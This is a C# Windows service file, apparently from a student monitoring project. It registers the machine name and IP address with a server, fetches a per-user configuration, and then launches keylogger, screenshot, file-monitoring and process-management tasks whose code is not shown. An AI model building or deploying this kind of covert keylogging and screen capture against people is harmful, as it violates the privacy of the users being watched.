using Newtonsoft.Json;
using StageprojectService.entities;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StageprojectService
{
    public partial class Service1 : ServiceBase
    {
        
        public static void window()
        {
            new MainPage().Show();
        }
        public static Thread th = null;
        public Service1()
        {
            InitializeComponent();
            // String ip = Methods.getAdressIp();
          
            if (Methods.CheckForInternetConnection())
            {

                var response = Methods.saveDB(Data.dbserver + "session/save", "{\"action\":\"ouverture\",\"user\":{\"machineName\":\"" + Methods.identifiant() + "\"}}");
                var response1 = Methods.saveDB(Data.dbserver + "adress/save", "{\"ip\":\"" + Methods.getAdressIp() + "\",\"user\":{\"machineName\":\"" + Methods.identifiant() + "\"}}");              
                th = new Thread(new ThreadStart(getUser));
                th.Start();
            }
           
           
           
            //getUser();
            //Thread.Sleep(10000);

            //if (Data.config.process)
            //{
            //    Task task = new Task(new Action(Methods.processManagement));
            //    task.Start();
            //    task.Wait();
            //}
            //if (Data.config.keylogger)
            //{
            //    Task task2 = new Task(new Action(Methods.Keylogger));
            //    task2.Start();
            //    task2.Wait();
            //}
            //if (Data.config.files)
            //{
            //    Task task4 = new Task(new Action(Methods.fileMonitoring));
            //    task4.Start();
            //    task4.Wait();
            //}
            //if (Data.config.screenshot)
            //{
            //    Task task5 = new Task(new Action(Methods.screenShot));
            //    task5.Start();
            //    task5.Wait();
            //}
            Application.Run(new MainPage());


        }

    

        private void connexion()
        {
            Application.Run(new MainPage());
        }

        public async void Configuration()
        {

            HttpClient http = new HttpClient();
            http.BaseAddress = new Uri("http://localhost:8080/configuration/save");
            http.DefaultRequestHeaders
            .Accept
            .Add(new MediaTypeWithQualityHeaderValue("application/json"));

            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "");
            request.Content = new StringContent("{\"process\": true,\"keylogger\": true,\"files\": true,\"screenshot\": true,\"intervalleScreenshot\": 15}", Encoding.UTF8, "application/json");//CONTENT-TYPE header
            //http.PostAsync(request)
            HttpResponseMessage msg = await http.SendAsync(request);
            string webresponse = await msg.Content.ReadAsStringAsync();
            int x = 0;
        }

        public async void getConfiguration()
        {
            HttpClient http = new HttpClient();
            HttpResponseMessage msg = await http.GetAsync("http://localhost:8080/configuration?id=1");
            string webresponse = await msg.Content.ReadAsStringAsync();
        }

        public static async void getUser()
        {
            try
            {
            HttpClient http = new HttpClient();
            HttpResponseMessage msg = await http.GetAsync(Data.dbserver + "user/usermachine?machineName=" + Methods.identifiant());
            string webresponse = await msg.Content.ReadAsStringAsync();
            User root = null;
           
                 root = JsonConvert.DeserializeObject<User>(webresponse);
                Data.config = root.configuration;
                Data.user = new User();
                Data.user.email = root.email;
                Data.user.machineName = root.machineName;
                Data.user.nom = root.nom;
                Data.user.prenom = root.prenom;
                prog();
              
            }
            catch (Exception e1)
            {
                MessageBox.Show(null,"il faut inscrire","ERREUR");
                //Environment.Exit(0);
                Console.WriteLine("User Not Found");
            }                       

        }
        public static void prog()
        {
            if (Data.config.process)
            {
                Task task = new Task(new Action(Methods.processManagement));
                task.Start();
                task.Wait();
            }
            if (Data.config.keylogger)
            {
                Task task2 = new Task(new Action(Methods.Keylogger));
                task2.Start();
                task2.Wait();
            }
            if (Data.config.files)
            {
                Task task4 = new Task(new Action(Methods.fileMonitoring));
                task4.Start();
                task4.Wait();
            }
            if (Data.config.screenshot)
            {
                Task task5 = new Task(new Action(Methods.screenShot));
                task5.Start();
                task5.Wait();
            }
        }

        protected override void OnStart(string[] args)
        {
            new MainPage().Show();
            
        }

        protected override void OnStop()
        {
            Thread.Sleep(40000);
            System.IO.File.WriteAllText(@"C:\logfile.txt", "terminer");
            Methods.start.EventArrived -= Methods.Start_EventArrived;
            Methods.stop.EventArrived -= Methods.Stop_EventArrived;
            Methods.start.Stop();
            Methods.stop.Stop();
        }


       

    }
}
